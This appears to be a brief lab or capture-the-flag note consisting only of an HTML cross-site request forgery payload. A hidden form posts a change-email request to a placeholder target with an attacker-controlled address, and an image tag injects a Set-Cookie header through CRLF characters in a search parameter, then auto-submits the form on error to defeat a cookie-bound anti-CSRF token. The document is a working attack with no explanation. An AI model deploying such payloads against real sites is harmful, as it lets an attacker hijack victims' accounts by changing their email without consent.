#csrf
```html
<form class="login-form" action="https://[TARGET_IP]/my-account/change-email" method="POST">
    <input hidden required type="email" name="email" value="modified@attacker.hack">
    <input hidden required type=hidden name=anti-csrf-token value=OfqXvkzlX2kAaaXhO9B7Mg0zx8YcEzu2>
</form>

<img src="https://[TARGET_IP]/?search=k%0d%0aSet-Cookie:%20csrfKey=WFsJNfTj8Nq7K6S18F5YPaWkM1MVYNe3" onerror="document.forms[0].submit()">
```